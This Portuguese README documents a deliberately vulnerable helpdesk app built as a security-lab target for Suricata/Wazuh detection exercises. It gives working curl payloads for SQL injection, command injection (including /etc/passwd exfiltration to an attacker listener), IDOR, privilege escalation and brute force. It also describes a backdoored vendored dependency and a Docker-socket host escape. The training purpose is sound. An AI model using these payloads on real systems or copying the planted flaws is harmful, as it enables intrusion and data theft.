# Aurora Chamados — Laboratório de Segurança (VM-alvo)

> ⚠️ **Aplicação deliberadamente vulnerável.** Não é software de produção. Não
> faça deploy exposto à internet e não reutilize este código, suas dependências
> ou seus padrões de autenticação em outro projeto.

## O que é este projeto

Este repositório é a **VM-alvo** de um laboratório de segurança acadêmico
(Projeto Integrador) cuja tese é: _código gerado por IA e dependências sem
revisão como vetor central de comprometimento em PMEs_.

"Aurora Chamados" é um portal de helpdesk/chamados que a fictícia consultoria
**Aurora Dev** entrega e hospeda em homologação para um cliente fictício. A
aplicação foi construída — de propósito — com vulnerabilidades clássicas
(OWASP Top 10 / CWE conhecidos) e dependências com CVEs públicos, para servir
de alvo em exercícios de:

- **Suricata** — detecção de tráfego malicioso na rede (DMZ)
- **Wazuh** — SIEM/EDR rodando como agente no host da aplicação

O laboratório completo inclui um roteador/firewall OPNsense e uma máquina de
ataque Kali (fora deste repositório).

📖 Documentação completa e fonte da verdade: workspace "Projeto Integrador" no
Notion (Stack e Arquitetura, Especificação da Aplicação, Catálogo de
Vulnerabilidades, Template de Relatório de Pentest).

## Stack e arquitetura

| Camada             | Tecnologia                                     | Porta |
| ------------------ | ---------------------------------------------- | ----- |
| Frontend           | React 19 (SPA, Vite)                           | 5173  |
| Backend            | Node.js + Express 4 (API REST)                 | 3001  |
| Banco de dados     | PostgreSQL 16                                  | 5432  |
| Orquestração local | Docker Compose (`db` + `backend` + `frontend`) | —     |

Convenção intencional do frontend: o token JWT fica em `localStorage` e o
papel do usuário é lido do token **no cliente**, sem validação server-side no
front — confiança indevida na camada de apresentação.

## Como rodar

```bash
cp .env.example .env      # ajuste POSTGRES_USER/PASSWORD/DB e JWT_SECRET se quiser
docker compose up         # sobe db (5432) + backend (3001) + frontend (5173)
```

Backend standalone: `cd backend && npm run dev` (nodemon).
Frontend standalone: `cd frontend && npm run dev` (vite).

No boot, o backend aplica `backend/src/schema.sql` e semeia usuários e
chamados de demonstração (ver `backend/src/bootstrap.js`), incluindo um login
`admin@aurora.local` / `admin123`, um `agente@aurora.local` / `agente123` e
dois clientes (`cliente1@exemplo.com` / `cliente123`, `cliente2@exemplo.com` /
`cliente123`) — senhas de laboratório, não use em ambiente real.

## Modelo de dados

- **usuarios** — id · nome · email (único) · senha_hash · papel
  [cliente\|agente\|admin] · telefone · cpf · empresa · criado_em
- **chamados** — id · titulo · descricao · status · prioridade ·
  solicitante_id → usuarios · agente_id → usuarios (nulo) · criado_em ·
  atualizado_em
- **comentarios** — id · chamado_id → chamados · autor_id → usuarios · corpo ·
  interno (bool) · criado_em
- **anexos** — id · chamado_id → chamados · nome_arquivo · caminho · criado_em

`telefone` e `cpf` são dados pessoais (gancho LGPD), relevantes porque vazam
via IDOR (ver abaixo).

## Papéis e funcionalidades

- **Cliente** (auto-cadastro): abre chamado, acompanha os próprios chamados,
  comenta, edita perfil.
- **Agente**: fila de chamados atribuídos, responde, muda status/prioridade,
  comentário interno (não visível ao cliente).
- **Admin**: gestão de usuários, dashboard global, exportar relatório/PDF.

Login/logout sem MFA para todos os papéis.

---

## Catálogo de vulnerabilidades e exemplos de input malicioso

Tudo abaixo é **intencional** — plantado para ser detectado/explorado no
laboratório. Os exemplos usam `http://localhost:3001` (backend padrão do
`docker compose`). Use apenas contra sua própria instância local/de
laboratório.

### 1. SQL Injection — `GET /api/chamados?busca=`

A busca de chamados concatena o parâmetro diretamente na query SQL, sem
parametrização (`backend/src/routes/chamados.js`). A listagem já filtra por
dono (`cliente` vê só os próprios chamados, `agente` só a fila atribuída,
`admin` vê todos) — mas o filtro é combinado via `AND` na mesma string SQL, e
um payload que feche o parêntese da condição de busca derruba o filtro de
dono junto:

```bash
# Fecha o parêntese da condição de busca e injeta OR (1=1) — vaza chamados
# de TODOS os usuários, mesmo logado como cliente comum.
curl --get "http://localhost:3001/api/chamados" \
  --data-urlencode "busca=x') OR (1=1) --" \
  -H "Authorization: Bearer $TOKEN"

# Encerrar a string e injetar uma cláusula adicional
curl --get "http://localhost:3001/api/chamados" \
  --data-urlencode "busca=x'; DROP TABLE comentarios;--" \
  -H "Authorization: Bearer $TOKEN"

# Exfiltração via UNION (nº de colunas depende do SELECT original)
curl --get "http://localhost:3001/api/chamados" \
  --data-urlencode "busca=x') UNION SELECT id,email,senha_hash,papel,null,null,null,null,null FROM usuarios--" \
  -H "Authorization: Bearer $TOKEN"
```

### 2. IDOR — `GET /api/chamados/:id`

Não há checagem de que o chamado pertence ao usuário autenticado. Qualquer
cliente autenticado pode ler chamados de terceiros — inclusive dados pessoais
do solicitante (telefone, CPF) via join.

```bash
# Logado como cliente1, acessando o chamado de outro cliente
for id in 1 2 3 4 5; do
  curl "http://localhost:3001/api/chamados/$id" -H "Authorization: Bearer $TOKEN"
done
```

### 3. Broken Access Control — `GET /api/usuarios`

A rota exige apenas um JWT válido, sem checar se o papel é `admin`. Um
`cliente` autenticado consegue listar todos os usuários da base (nome, email,
telefone, CPF, empresa).

```bash
curl "http://localhost:3001/api/usuarios" -H "Authorization: Bearer $TOKEN_CLIENTE"
```

### 4. Escalonamento de privilégio — `PATCH /api/usuarios/:id`

O `PATCH` aceita alterar o campo `papel` sem checar se quem chama é admin nem
se está alterando o próprio registro.

```bash
# Cliente promove a si mesmo a admin
curl -X PATCH "http://localhost:3001/api/usuarios/3" \
  -H "Authorization: Bearer $TOKEN_CLIENTE" \
  -H "Content-Type: application/json" \
  -d '{"papel": "admin"}'
```

### 5. Command Injection — `GET /api/chamados/:id/pdf`

A exportação de PDF monta um comando de shell (`exec`) usando o título do
chamado e o parâmetro `nome` da query string, sem sanitização.

```bash
# Executa `id` no servidor via encadeamento de comando
curl "http://localhost:3001/api/chamados/1/pdf?nome=relatorio.pdf;id" \
  -H "Authorization: Bearer $TOKEN"

# Exfiltra /etc/passwd para um listener do atacante
curl "http://localhost:3001/api/chamados/1/pdf?nome=x.pdf%20%26%26%20curl%20http://ATACANTE:8000/--data-binary%20@/etc/passwd" \
  -H "Authorization: Bearer $TOKEN"

# Substituição de comando via crase/backtick
curl "http://localhost:3001/api/chamados/1/pdf?nome=\$(whoami).pdf" \
  -H "Authorization: Bearer $TOKEN"
```

### 6. Upload sem limites — `POST /api/chamados/:id/anexos` (multer 1.4.4-2.0.1 / CVE-2025-47944)

Não há limite de tamanho/quantidade de arquivo configurado no multer,
permitindo esgotamento de disco/memória (DoS) com uploads grandes ou repetidos.

```bash
# Upload repetido de arquivos grandes para esgotar disco/memória
for i in $(seq 1 50); do
  curl -X POST "http://localhost:3001/api/chamados/1/anexos" \
    -H "Authorization: Bearer $TOKEN" \
    -F "arquivo=@/dev/urandom;filename=lixo$i.bin"
done
```

### 7. Autenticação fraca

- **Hash de senha**: MD5 sem salt (`backend/src/auth.js`) — trivialmente
  quebrável por rainbow table/força bruta (`admin123`, `agente123`,
  `cliente123` são exemplos de senhas fracas já semeadas no banco).
- **JWT sem `algorithms` fixado** em `jwt.verify()` — abre margem para ataques
  de confusão de algoritmo caso o segredo/chave pública fique acessível.
- **Segredo de JWT previsível**: cai para um valor padrão fixo no código caso
  `JWT_SECRET` não esteja definido no ambiente.
- **Sem rate-limit** em `POST /api/auth/login` — permite força bruta de
  credenciais sem bloqueio:

```bash
for senha in 123456 admin123 senha123 aurora2024; do
  curl -X POST "http://localhost:3001/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@aurora.local\",\"senha\":\"$senha\"}"
done
```

### 8. Dependência maliciosa (slopsquatting) — backdoor de autenticação

O backend usa um pacote local `express-audit-log` (vendorizado em
`backend/vendor/express-audit-log/`, nome plausível de um "pacote de
auditoria" que uma IA sugeriria sem revisão) que, além de logar requisições,
contém um backdoor: ao ver o header `X-Debug` com o valor esperado, ele forja
um JWT `papel: admin` usando o mesmo segredo fraco do projeto e sobrescreve o
`Authorization` da requisição **antes** do middleware de autenticação normal
rodar — qualquer requisição vira admin, mesmo sem token nenhum. O pacote
também dispara uma tentativa de conexão de saída (beacon) no startup do
processo.

```bash
# Sem token nenhum, a rota normalmente nega:
curl -i "http://localhost:3001/api/usuarios"

# O header mágico do backdoor concede acesso sem nenhuma credencial real:
curl -i "http://localhost:3001/api/usuarios" -H "X-Debug: trace-9f2c"
```

Diferente das 2 dependências da tabela abaixo, este pacote **não tem CVE
público** — não há nada a correlacionar contra uma base de vulnerabilidades
conhecidas. Só é interceptado em runtime: Wazuh (processo com conexão de
saída anômala no startup, FIM sobre `node_modules`/`vendor`) e Suricata
(tráfego C2 de saída).

## Dependências vulneráveis conhecidas (CVE público)

| Pacote       | Versão fixada       | CVE                                  | CWE                     |
| ------------ | ------------------- | ------------------------------------ | ----------------------- |
| jsonwebtoken | ≤ 8.5.1             | CVE-2022-23539 / 23540 / 23541       | CWE-287 (auth bypass)   |
| multer       | 1.4.4-lts.1 – 2.0.1 | CVE-2025-7338 (+2026-2359/3304/3520) | CWE-248 (DoS)           |

Essas versões estão **fixadas de propósito** em `backend/package.json` — não
devem ser atualizadas fora do escopo do exercício.

### Fingerprinting de versão — `GET /api/version`

Sem autenticação, devolve nome/versão/dependências direto do
`package.json` (`backend/src/index.js`) — pensado como "diagnóstico de
build/deploy", mas permite ao atacante confirmar a versão exata de cada
dependência fixada acima antes de escolher qual CVE explorar:

```bash
curl "http://localhost:3001/api/version"
```

> O pacote `express-audit-log` (item 8 acima) não aparece nesta tabela de
> propósito: é uma dependência maliciosa sem CVE público — só a detecção em
> runtime (Wazuh/Suricata) identifica esse tipo de ameaça, não a checagem de
> dependências conhecidas.

### Painel interno esquecido — credenciais compartilhadas pela equipe

Página `/interno-equipe` (fora do menu e do `ProtectedRoute`) e a rota
`GET /api/interno/equipe` (`backend/src/routes/interno.js`, sem
`authMiddleware`) expõem uma "planilha" de credenciais de sistemas internos
da Aurora Dev — VPN, painel de hospedagem, backup e Postgres de produção —
deixada em produção depois do deploy em homologação. O caminho é descoberto
via `robots.txt`, que tenta esconder a página dos buscadores e acaba
revelando-a no recon:

```bash
curl "http://localhost:5173/robots.txt"          # Disallow: /interno-equipe
curl "http://localhost:3001/api/interno/equipe"  # credenciais em JSON, sem token
```

Diferente dos itens 1–8 (padrões de código que uma IA emite sem revisão),
este é um terceiro tipo de falha: um artefato interno esquecido pela própria
equipe, sem checagem de acesso nenhuma (CWE-912) — achado clássico de pentest
real, independente do IDOR de `chamados`.

### Docker inseguro — socket do Docker montado no backend

O `docker-compose.yml` monta `/var/run/docker.sock` dentro do container do
`backend` (rw), sem nenhuma rota da aplicação consumindo esse acesso — decisão
de infra pensada para uma feature futura de "verificar status do ambiente"
que nunca foi implementada. Quem consegue executar comandos dentro do
container do backend (via SQLi, IDOR, command injection do export de PDF, ou
forja de JWT) fala diretamente com o daemon Docker do host e escapa para ele:

```bash
# de dentro do container do backend, após qualquer RCE anterior:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
docker run --privileged -v /:/hostfs alpine chroot /hostfs id   # root no host
```

Um quarto tipo de falha: diferente dos itens de código/dependência acima,
essa mora na decisão de orquestração (`docker-compose.yml`), não no código da
aplicação (CWE-250 — Execution with Unnecessary Privileges).

## Aviso final

Todos os exemplos acima existem para permitir que ferramentas de detecção
(Suricata/Wazuh) identifiquem e alertem sobre a exploração no ambiente
isolado do laboratório. Não execute esses payloads contra sistemas que você
não tem autorização explícita para testar.
